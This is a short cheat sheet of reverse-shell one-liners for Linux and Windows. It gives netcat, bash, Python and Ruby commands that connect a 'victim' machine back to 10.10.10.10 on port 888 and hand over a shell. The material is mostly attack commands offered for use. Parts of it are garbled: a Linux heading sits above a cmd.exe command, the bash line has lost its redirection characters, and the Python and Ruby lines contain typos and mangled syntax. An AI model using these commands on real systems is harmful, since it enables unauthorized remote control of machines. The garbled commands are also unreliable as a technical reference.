# Reverse Shell Commands
The following are some useful commands to start listeners and reverse shells in Linux and Windows-based systems.

## Netcat Linux Reverse Shell
`nc 10.10.10.10 888 -e /bin/sh`
* 10.10.10.10 is the IP address of the machine you want the victim to connect to.
* 888 is the port number (change this to whatever port you would like to use, just make sure that no firewall is blocking it).

## Netcat Linux Reverse Shell
`nc 10.10.10.10 888 -e cmd.exe`
* 10.10.10.10 is the IP address of the machine you want the victim to connect to.
* 888 is the port number (change this to whatever port you would like to use, just make sure that no firewall is blocking it).

## Using Bash
`bash -i & /dev/tcp/10.10.10.10/888 0 &1`

## Using Python
`python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.10.10",888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(l,1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'` 

## Using Ruby
`ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",888).to_i; exec sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'`
